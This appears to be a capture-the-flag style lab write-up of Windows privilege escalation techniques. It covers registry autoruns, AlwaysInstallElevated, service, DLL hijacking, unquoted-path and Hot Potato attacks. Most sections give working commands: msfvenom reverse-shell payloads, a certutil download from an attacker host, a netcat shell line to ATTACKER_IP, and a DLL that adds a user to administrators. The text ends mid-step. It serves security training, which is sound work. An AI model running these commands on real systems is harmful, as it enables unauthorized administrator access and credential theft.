# Windows PrivEsc Arena

This room will teach you a variety of Windows privilege escalation tactics, including kernel exploits, DLL hijacking, service exploits, registry exploits, and more. This lab was built utilizing Sagi Shahar's privesc workshop (https://github.com/sagishahar/lpeworkshop) and utilized as part of The Cyber Mentor's Windows Privilege Escalation Udemy course (http://udemy.com/course/windows-privilege-escalation-for-beginners).

All tools needed to complete this course are on the user desktop (C:\Users\user\Desktop\Tools).

Let's first connect to the machine. RDP is open on port 3389. Your credentials are:

`username: user` \
`password: password321`

For any administrative actions you might take, your credentials are:

`username: TCM` \
`password: Hacker123`

First list the users existent on machine:

```powershell
net user
```

<figure><img src="../../.gitbook/assets/image (442).png" alt=""><figcaption></figcaption></figure>

## Registry Escalation - Autorun

Open command prompt and type: `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe`

In Autoruns, click on the ‘Logon’ tab.

From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.

<figure><img src="../../.gitbook/assets/image (443).png" alt=""><figcaption></figcaption></figure>

Registry Run key permit to specify programs that run each time a user logs on. We can verify directly it by using regedit:

<figure><img src="../../.gitbook/assets/image (444).png" alt=""><figcaption></figcaption></figure>

In command prompt type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"

From the output, notice that the “Everyone” user group has “FILE\_ALL\_ACCESS” permission on the “program.exe” file.

<figure><img src="../../.gitbook/assets/image (445).png" alt=""><figcaption></figcaption></figure>

**Registry Run key**

If we create a new "Test Run" entry in Run Registry (as user administrator) we can prove that this script is executed at every logon.

<figure><img src="../../.gitbook/assets/image (446).png" alt=""><figcaption></figcaption></figure>

\
This script generate a random number and write it to a file on the desktop of user "user".\
The current value of random\_numer.txt is 92:

<figure><img src="../../.gitbook/assets/image (447).png" alt=""><figcaption></figcaption></figure>

If we now logon again as "user", the random number is changed as we expected:

<figure><img src="../../.gitbook/assets/image (448).png" alt=""><figcaption></figcaption></figure>

### Exploitation

On Kali VM:

1. Open command prompt and type: `msfconsole`
2. In Metasploit (msf > prompt) type: `use multi/handler`
3. In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp`
4. In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
5.  In Metasploit (msf > prompt) type: `run`\


    <figure><img src="broken-reference" alt=""><figcaption><p>Meterpreter session waiting for reverse TCP shell</p></figcaption></figure>
6.  Open an additional command prompt and generate the payload by typing: `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe`\


    <figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>
7. Copy the generated file, `program.exe`, to the Windows VM.
8. Place program.exe in ‘`C:\Program Files\Autorun Program`’.
9. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.
10. Wait for a new session to open in Metasploit.\


    <figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>
11. In Metasploit (msf > prompt) type: `sessions -i [Session ID]`
12. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: `getuid`\


    <figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

## Registry Escalation - AlwaysInstallElevated

As we all are aware that Windows OS comes installed with a Windows Installer engine which is used by **MSI packages** for the installation of applications. These MSI packages can be installed with elevated privileges for non-admin users

For this purpose, the **AlwaysInstallElevated** policy feature is used to install an MSI package file with elevated (system) privileges. This policy is enabled in the Local Group Policy editor; directs the Windows Installer engine to use elevated permissions when it installs any program on the system. This method can make a machine vulnerable posing a high-security risk because a non-administrator user can run installations with elevated privileges and access many secure locations on the computer.

Type `gpedit.msc` and then search under **`Computer Configuration\Administrative Templates\Windows Components\Windows Installer`**:

<figure><img src="broken-reference" alt=""><figcaption><p>Computer Configuration AlwaysInstallElevated</p></figcaption></figure>

The same policy exist also under **`User Configuration\Administrative Templates\Windows Components\Windows Installer`** and need to be enabled in order to work:

<figure><img src="broken-reference" alt=""><figcaption><p>User Configuration AlwaysInstallElevated</p></figcaption></figure>

1. Open command prompt and type: \
   \
   `reg query HKLM\Software\Policies\Microsoft\Windows\Installer` \


<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

2. From the output, notice that “`AlwaysInstallElevated`” value is 1.
3.  In command prompt type: \
    \
    `reg query HKCU\Software\Policies\Microsoft\Windows\Installer` \
    \


    <figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>
4. From the output, notice that “AlwaysInstallElevated” value is 1.

### Exploitation

To exploit this vulnerability generate an MSI Package file (**revshell.msi** ) utilizing the Windows Meterpreter payload as follows:

1. Open command prompt and type: `msfconsole`
2. In Metasploit (msf > prompt) type: `use multi/handler`
3. In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp`
4. In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
5. In Metasploit (msf > prompt) type: `run`\
   ![](broken-reference)
6.  Open an additional command prompt and type:\
    `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] lport=[Kali VM Port] -f msi -o revshell.msi`\


    <figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>
7.  Copy the generated file, revshell.msi, to the Windows VM under `C:\Temp` (using for example a previous obtained shell access):\


    <figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>


8.  Open command prompt and type: `msiexec /quiet /qn /i C:\Temp\revshell.msi`\


    <figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Now we are `NT AUTHORITY\SYSTEM`:\


<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

## Service Escalation - Remote Registry Service

The Service Host: <mark style="color:orange;">**Remote Registry**</mark> process, also known as “svchost.exe -k regsvc,” is a legitimate Windows system process responsible for managing the remote registry service. The remote registry service allows remote users to access and modify the Windows registry on a computer over a network connection.

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

If we analyze the Access Control List for this service, we find that permissions (<mark style="color:red;">**in red**</mark>) are different from how they should be configured correctly (<mark style="color:green;">**in green**</mark>).

1. Open powershell prompt and type: \
   `Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`
2.  Notice that the output suggests that user belong to “`NT AUTHORITY\INTERACTIVE`” has “FullControl” permission over the registry key.\


    <figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>



`NT AUTHORITY\INTERACTIVE` is a built-in security principal in Windows OS.&#x20;

It represents any user who is currently interactively logged on to the system, either locally at the console or through a remote desktop session. In other words, <mark style="color:red;">**it refers to users who are actively using the system**</mark>.

When a user logs in interactively, either by physically sitting at the computer or by connecting remotely, their authentication token is associated with the "NT AUTHORITY\INTERACTIVE" security principal. This allows the operating system to apply security policies and permissions specific to interactive logons.

This security principal is often used in access control lists (ACLs) and security settings to grant or deny permissions based on whether a user is logged on interactively or not. It helps differentiate between users who are actively using the system and those who might be running background processes or services.

### Exploitation

In this case, we have permission to add keys in the HKLM registry by using the `regsvc` service.

Information about each service on the system is stored in the registry. The `ImagePath`registry key typically contains the path of the driver’s image file. Hijacking this key with an arbitrary executable will have as a result the payload to run during service start.

1. Copy `C:\Users\User\Desktop\Tools\Source\windows_service.c` to the Kali VM.

On Kali VM:

1.  Open windows\_service.c in a text editor and replace the command used by the system() function to: `cmd.exe /k net localgroup administrators user /add`\


    <figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>
2.  Exit the text editor and compile the file by typing the following in the command prompt: \
    `x86_64-w64-mingw32-gcc windows_service.c -o x.exe`\
    (:warning: if this is not installed, use `sudo apt install gcc-mingw-w64`)\


    <figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>
3. Copy the generated file x.exe, to the Windows VM.
4.  Place x.exe in `C:\Temp`\


    <figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>
5.  To execute the file exe that we upload, we need to add its path in a new key in the registry by running the command:\
    `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`\
    \


    <figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>



    With the reg add we add a new registry entry, in particular:\
    \- HKLM\SYSTEM\CurrentControlSet\services\regsvc is the full path of the subkey to be added\
    \- /v Image Path is the name of the add registry entry\
    \- /t REG\_EXPAND\_SZ is the type for the registry entry\
    \- /d c:\temp\x.exe is the data for the new registry entry (in this case, in our malicious file)\
    \- /f is needed to add the registry entry without prompting for confirmation


6.  In the command prompt type: `sc start regsvc`\


    <figure><img src="broken-reference" alt=""><figcaption><p>Status of service is START_PENDING</p></figcaption></figure>
7.  It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: \
    `net localgroup administrators`\


    <figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>



## Service Escalation - Executable Files

<figure><img src="broken-reference" alt=""><figcaption><p>user is NOT in administrators group</p></figcaption></figure>

If a user has to write permissions in a folder used by a service, then he can replace the binary with a malicious one. In this way, when the service is restarted, the malicious file will be executed.

To check the user permission of the “File Permissions Service” folder, we use our good friend `accesschk64.exe.` \
Open command prompt and type: `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu “C:\Program Files\File Permissions Service”`\


<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Notice that the `Everyone` user group has `FILE_ALL_ACCESS` permission on the `filepermservice.exe` file. This file is executed by a service called File Permission Service:\


<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

### Exploitation

We can use our previously generated x.exe file. So, we replace the filepermservice.exe with our x.exe and execute it.

1. Open command prompt and type: \
   `copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"`
2.  In command prompt type: `sc start filepermsvc`\


    <figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

The status of service remain in Running undefined and that sounds like a success because now "user" is again in administrator group:\


<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

## Privilege Escalation - Startup Applications

In Windows, as in other operating systems, we can configure some applications to run on boot, including their system privilege. So, if we have permission to write the `Startup folder`, we can execute malicious files automatically after that some user (we hope admin) do the login.

There are actually two startup folders on your computer. One is the <mark style="color:blue;">**personal startup folder**</mark> for your account, which is located here:

`C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

The other startup folder contains programs that automatically run for <mark style="color:blue;">**every user**</mark> on your computer. You can find this at:

`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`

To detect this misconfiguration, we use `icacls` that give us the lists of permissions of the specified file:

```powershell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

<figure><img src="broken-reference" alt=""><figcaption><p>DACLs on Startup Folder</p></figcaption></figure>

In this case, we can see that the `BUILTIN\Users` group has full access <mark style="color:red;">**(F)**</mark> to the Startup directory. Since our user belongs to the Users group, we can put the malicious file that will be generated automatically.

### Exploitation

To do the exploitation of this vulnerability, we set a Metasploit listener:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Then we generate the malicious file:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.4.250 LPORT=4444 -f exe -o startup.exe
```

and we download the file from attacker machine using certutil:

```powershell
certutil -f -urlcache http://10.18.4.250:8000/startup.exe startup.exe
```

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Now, we simulate the login of the “TCM” user (that is admin) by RDPing on machine:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

## Service Escalation - DLL Hijacking

When we execute an application in a Windows system, many of the functionalities of the programs are provided by DLL files. Indeed, when a program starts it looks for DLLs. So, if some DLL is missing, and we have the write permission, then we can replace that missing DDL with our malicious file. In this way, when the application starts, it executes our file.

Generally, a Windows application will use pre-defined search paths to find DLL’s and it will check these paths in the following order:

1. The directory from which the application loaded
2. 32-bit System directory (C:\Windows\System32)
3. 16-bit System directory (C:\Windows\System)
4. Windows directory (C:\Windows)
5. The current working directory (CWD)
6. Directories in the PATH environment variable (first system and then user)

To detect this vulnerability, we must find some missing DLL that some programs look for. First we can find some not builtin Windows service like this one:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

and analyze it using `Procmon.exe`:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

There are many processes but use the function `filter` to search what we want:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

So, we filter the Process Name by searching `dllhijackservice.exe` and we add the rule (we note the first row is our rule, just created):

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Then, since we look for missing DLL, we filter the **Result** field with the string `NAME NOT FOUND` and we add the rule:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Now, we can run the `dllsvc` service:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

And, by returning to procmon, we have the following result:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

These are some of the DLLs that the program dllhijackservice.exe can not found. We can note the last row which contains the path C:\Temp\hijackme.dll. If we have permission to overwrite this file, we can replace it with a malicious file.

### Exploitation

Since in the Windows machine there are some tools already uploaded, we downloaded on our Kali machine the source code in `C:\Users\User\Desktop\Tools\Source\windows_dll.c` and we change the function `DllMain`:

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}

```

We compile it with the command:

```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
```

{% hint style="danger" %}
It must have the same file of DLL that process try to load as we have seen before!
{% endhint %}

Now "user" is not in Administrators group:\


<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

We upload the compiled file in victim machine and we copy it in `C:\Temp`:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Finally, we stop and start the dllsvc service with the command:

```powershell
sc stop dllsvc & sc start dllsvc
```

Now we no longer have the `NAME NOT FOUND` error we had before for the `C:\Temp` path which means that the malicious DLL was loaded and executed correctly by the service:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

And we confirm the successfully exploit by checking if the user belongs to the localgroup administrators:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

## Service Escalation - binPath

`binPath` is used to specific binary paths to Windows services. Is the location that points the service to the binary that need to execute when the service is started. If we have permission to modify the configuration, we can exploit this vulnerability. To check the permission, we can use `accesschk`.

1. Open command prompt and type: `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc`
2.  We note that the `Everyone` has the `SERVICE_CHANGE_CONFIG` permission. Thanks to this, we can configure the daclsvc service (owned by the system) to run whatever command we want, like, for example, a command to elevate the user to admin privileges or maybe a command that sends back a shell with system privileges (sc config daclsvc binpath= “nc.exe ATTACKER\_IP 4444 -e cmd.exe”). In this case, we add the user in the administrator localgroup.\


    <figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
In the context of Windows services, the "binpath" refers to the executable file or command that the service runs. The "binpath" specifies the full path to the executable file associated with the service, along with any command-line arguments if needed.

When you are configuring or managing a Windows service, you may come across the "binpath" parameter. It can be a path to an executable or a command. Here's a brief explanation:

1. **Executable Path:**
   * If the service is associated with an executable file, the "binpath" should point to the location of that executable.
   * Example: `"C:\Path\To\Your\Service.exe"`
2. **Command Line:**
   * If the service is associated with a command, the "binpath" includes both the command and any necessary arguments.
   * Example: `"C:\Path\To\Your\Command.exe arg1 arg2"`


{% endhint %}

### Exploitation

To exploit this, we run the following command:

```powershell
sc config daclsvc binpath= "net localgroup administrators user /add"
```

Then we start the daclsvc service with the command sc start daclsvc and finally, we check that the user belongs to administrator localgroup:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

## Service Escalation - Unquoted Service Paths

When a service is started, the Windows system tries to find the location of the executable to run the service. Indeed, if the executable path is enclosed in the quote `“”` then the system will know exactly where to find it. But, if in the path there are any quotes, then Windows will look for it and execute it in every folder of the path. So, for example, if we have the path:

`C:\Program Files\Unquoted Path Service\Common Files\service.exe`

Windows will search in this order:

1. C:\Program.exe&#x20;
2. C:\Program Files\Unquoted.exe
3. C:\Program Files\Unquoted Path.exe&#x20;
4. C:\Program Files\Unquoted Path Service\Common.exe
5. &#x20;C:\Program Files\Unquoted Path Service\Common Files\service.exe

To view the information about services we can use `sc` utility and we use the `qc` command to display the information, in particular, the `BINARY_PATH_NAME`field which we are interested:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

We can see that in the `BINARY_PATH_NAME` we have the path `C:\Program Files\Unquoted Path Services\Common Files\unquotedpathservice.exe`. We want to place some malicious file in that path so that Windows will execute it.

### Exploitation

So we choose to place a file named common.exe in the path `C:\Program Files\Unquoted Path Service:`\
We generate the malicious file:

```bash
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
```

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Then we upload the file and copy it in `C:\Program Files\Unquoted Path Service`:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Then we start the unquotedsvc service (by using the command `sc start unquotedsvc`) and we check if our user belongs to administrator localgroup:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

## Potato Escalation - Hot Potato

“Hot Potato is a technique that takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP->SMB relay) and NBNS spoofing”.

{% file src="broken-reference" %}

### Exploit

To exploit this vulnerability, we can use `Tater` module that is a PowerShell implementation of the Hot Potato Windows Privilege Escalation. So we, first, start Powershell with bypass option to bypass firewall:

```powershell
powershell.exe -nop -ep bypass
```

Then, we import the Tater module:

```powershell
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
```

Finally, we run the Tater module bypassing the command net localgroup administrators user /add to add our user in administrators localgroup:

```powershell
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

The execution and the output of the command net localgroup administrators to check if the exploit had success:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

## Password Mining Escalation - Configuration Files

Many times the developers or the administrator put the password in the configuration files. Therefore, by searching words like “password” or “passwd” we can obtain the password used in the system. Also, these passwords are obfuscated in base64, so it is easy to retrieve the cleartext.

### Exploitation

In this task, the password is in the `C:\Windows\Panther\Unattend.xml` file and it is in base64.

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

So, we take the base64 password and with the following command we can obtain the password in cleartext:

```bash
	
$ echo cGFzc3dvcmQxMjM= | base64 -d
> password123 
```

## Password Mining Escalation - Memory

Sometimes services save the user credentials <mark style="color:red;">**in clear text in memory**</mark> :cry:. When this happens, we can dump what is saved in the memory and read the saved credentials.

### Exploit

To exploit this vulnerability, we use the `http_basic` module of Metasploit to generate a prompt for credentials.\


We set the field `SRVHOST`, `SRVPORT` with the Kali Machine IP and port that will simulate a web server and the `URIPATH`:\


<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

From Windows machine navigate to: [http://10.18.4.250:8080/fake](http://10.18.4.250:8080/fake)[\
](http://10.18.4.250:8080/fake)

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

Insert some credentials like test:test:

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

And we will see this credentials on msfconsole:
